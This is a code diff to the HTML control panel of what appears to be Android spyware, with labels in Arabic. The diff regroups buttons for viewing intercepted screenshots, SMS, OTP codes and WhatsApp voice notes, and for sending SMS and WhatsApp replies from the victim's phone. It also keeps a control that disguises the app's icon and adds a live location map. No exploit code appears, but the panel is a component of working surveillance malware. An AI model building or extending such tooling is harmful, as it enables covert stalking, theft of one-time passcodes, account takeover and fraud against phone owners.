@@ -19,38 +19,66 @@
                 <button onclick="logout()" class="logout-btn">خروج</button>
             </div>
 
-            <div style="display:flex;gap:12px;margin-top:15px;flex-wrap:wrap;justify-content:center;">
-                <button id="liveImagesBtn" onclick="openLiveImages()" style="background:linear-gradient(135deg,#00ffcc,#009977);color:#000;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(0,255,204,0.6);">
-                    🆕 الصور الفورية <span id="liveImagesCount" style="background:#000;color:#00ffcc;padding:2px 8px;border-radius:10px;margin-right:5px;font-size:12px;">0</span>
+            <div class="action-grid">
+                <button id="liveImagesBtn" onclick="openLiveImages()" class="action-btn-grid style-images">
+                    <span class="icon">🆕</span>
+                    <span class="text">الصور الفورية</span>
+                    <span id="liveImagesCount" class="badge">0</span>
                 </button>
-                <button id="liveMsgsBtn" onclick="openLiveMessages()" style="background:linear-gradient(135deg,#ff0066,#cc0052);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(255,0,102,0.6);">
-                    🆕 الرسائل الفورية <span id="liveMsgsCount" style="background:#000;color:#ff0066;padding:2px 8px;border-radius:10px;margin-right:5px;font-size:12px;">0</span>
-                </button>
-                <button id="liveOtpBtn" onclick="openLiveOtp()" style="background:linear-gradient(135deg,#ffcc00,#cc9900);color:#000;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(255,204,0,0.6);">
-                    🔐 OTP <span id="liveOtpCount" style="background:#000;color:#ffcc00;padding:2px 8px;border-radius:10px;margin-right:5px;font-size:12px;">0</span>
-                </button>
-                <button id="liveVoicesBtn" onclick="openLiveVoices()" style="background:linear-gradient(135deg,#00ffcc,#006677);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(0,255,204,0.6);">
-                    🎤 صوتيات واتساب <span id="liveVoicesCount" style="background:#000;color:#00ffcc;padding:2px 8px;border-radius:10px;margin-right:5px;font-size:12px;">0</span>
-                </button>
-            </div>
 
-            <div style="display:flex;gap:12px;margin-top:10px;flex-wrap:wrap;justify-content:center;">
-                <button id="sendSmsBtn" onclick="openSendSms()" style="background:linear-gradient(135deg,#25D366,#128C7E);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(37,211,102,0.6);">
-                    📨 إرسال SMS
+                <button id="liveMsgsBtn" onclick="openLiveMessages()" class="action-btn-grid style-msgs">
+                    <span class="icon">🆕</span>
+                    <span class="text">الرسائل الفورية</span>
+                    <span id="liveMsgsCount" class="badge">0</span>
                 </button>
-                <button id="replyWaBtn" onclick="openReplyWaPicker()" style="background:linear-gradient(135deg,#128C7E,#075E54);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(18,140,126,0.6);">
-                    ↩️ رد واتساب
+
+                <button id="liveOtpBtn" onclick="openLiveOtp()" class="action-btn-grid style-otp">
+                    <span class="icon">🔐</span>
+                    <span class="text">OTP</span>
+                    <span id="liveOtpCount" class="badge">0</span>
                 </button>
-                <button id="disguiseBtn" onclick="openDisguiseMenu()" style="background:linear-gradient(135deg,#9b59b6,#8e44ad);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(155,89,182,0.6);">
-                    🎭 تغيير الأيقونة
+
+                <button id="liveVoicesBtn" onclick="openLiveVoices()" class="action-btn-grid style-voices">
+                    <span class="icon">🎤</span>
+                    <span class="text">صوتيات واتساب</span>
+                    <span id="liveVoicesCount" class="badge">0</span>
+                </button>
+
+                <button id="sendSmsBtn" onclick="openSendSms()" class="action-btn-grid style-sms">
+                    <span class="icon">📨</span>
+                    <span class="text">إرسال SMS</span>
+                </button>
+
+                <button id="replyWaBtn" onclick="openReplyWaPicker()" class="action-btn-grid style-wa">
+                    <span class="icon">↩️</span>
+                    <span class="text">رد واتساب</span>
+                </button>
+
+                <button id="disguiseBtn" onclick="openDisguiseMenu()" class="action-btn-grid style-disguise">
+                    <span class="icon">🎭</span>
+                    <span class="text">تغيير الأيقونة</span>
                 </button>
             </div>
         </header>
 
         <div class="status-bar">
-            <div class="status-item"><span class="label">الحالة:</span><span id="networkStatus" class="value">غير متصل</span></div>
-            <div class="status-item"><span class="label">البطارية:</span><span id="batteryStatus" class="value">—</span></div>
-            <div class="status-item"><span class="label">آخر اتصال:</span><span id="lastSeen" class="value">—</span></div>
+            <div class="status-item">
+                <span class="label">الحالة:</span>
+                <span id="networkStatus" class="value">غير متصل</span>
+            </div>
+            <div class="status-item">
+                <span class="label">📶 الشبكة:</span>
+                <span id="networkTypeStatus" class="value">—</span>
+            </div>
+            <div class="status-item">
+                <span class="label">🔋 البطارية:</span>
+                <span id="batteryStatus" class="value">—</span>
+                <span id="chargingStatus" style="color:#00ff88;font-size:12px;font-weight:bold;margin-right:5px;"></span>
+            </div>
+            <div class="status-item">
+                <span class="label">🕐 آخر اتصال:</span>
+                <span id="lastSeen" class="value">—</span>
+            </div>
         </div>
 
         <div class="tabs">
@@ -95,10 +123,23 @@
                     <div id="contactDetails"></div>
                 </div>
             </div>
+
             <div id="locationTab" class="tab-pane">
-                <h3>📍 الموقع</h3>
-                <div id="locationDetails"></div>
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
+                    <h3 style="margin:0;border:none;padding:0;">📍 الموقع الحي</h3>
+                    <button onclick="reloadMap()" style="background:#00ffcc;color:#000;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                        🔄 تحديث
+                    </button>
+                </div>
+                <iframe 
+                    id="mapFrame"
+                    src="/map.html" 
+                    style="width:100%; height:75vh; border:1px solid #00ffcc; border-radius:8px; background:#000;"
+                    frameborder="0"
+                    loading="lazy">
+                </iframe>
             </div>
+
             <div id="imagesTab" class="tab-pane">
                 <h3>🖼️ الصور</h3>
                 <div id="imagesGrid" class="images-grid"></div>
@@ -118,7 +159,6 @@
                 <div id="deletedList"></div>
             </div>
 
-            <!-- ✅ محدّث: تبويب واتساب مع زر المسح -->
             <div id="whatsappTab" class="tab-pane">
                 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
                     <h3 style="margin:0;border:none;padding:0;">💬 رسائل واتساب</h3>
@@ -175,7 +215,6 @@
         </div>
     </div>
 
-    <!-- ✅ نافذة الصور الفورية -->
     <div id="liveImagesOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#00ffcc;text-shadow:0 0 15px #00ffcc;">📸 الصور الفورية</h2>
@@ -185,11 +224,10 @@
             </div>
         </div>
         <div id="liveImagesGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px;">
-            <p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">في انتظار صور جديدة... خذ سكرين شوت أو استقبل صورة واتساب وراح تظهر هنا فوراً</p>
+            <p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">في انتظار صور جديدة...</p>
         </div>
     </div>
 
-    <!-- ✅ نافذة الرسائل الفورية -->
     <div id="liveMsgsOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#ff0066;text-shadow:0 0 15px #ff0066;">💬 الرسائل الفورية</h2>
@@ -202,11 +240,10 @@
             </div>
         </div>
         <div id="liveMsgsList" style="display:flex;flex-direction:column;gap:10px;">
-            <p style="color:#666;text-align:center;padding:50px;">في انتظار رسائل جديدة... أرسل أو استقبل رسالة SMS وراح تظهر هنا فوراً</p>
+            <p style="color:#666;text-align:center;padding:50px;">في انتظار رسائل جديدة...</p>
         </div>
     </div>
 
-    <!-- ✅ نافذة OTP الفورية -->
     <div id="liveOtpOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#ffcc00;text-shadow:0 0 15px #ffcc00;">🔐 أكواد OTP</h2>
@@ -220,7 +257,6 @@
         </div>
     </div>
 
-    <!-- ✅ نافذة الرسائل الصوتية -->
     <div id="liveVoicesOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#00ffcc;text-shadow:0 0 15px #00ffcc;">🎤 الرسائل الصوتية</h2>
@@ -239,6 +275,10 @@
     <script>
     document.addEventListener('DOMContentLoaded', function() { playSound(); });
     function playSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
+    function reloadMap() {
+        const iframe = document.getElementById('mapFrame');
+        if (iframe) iframe.src = iframe.src;
+    }
     </script>
 </body>
-                </html>
+    </html>
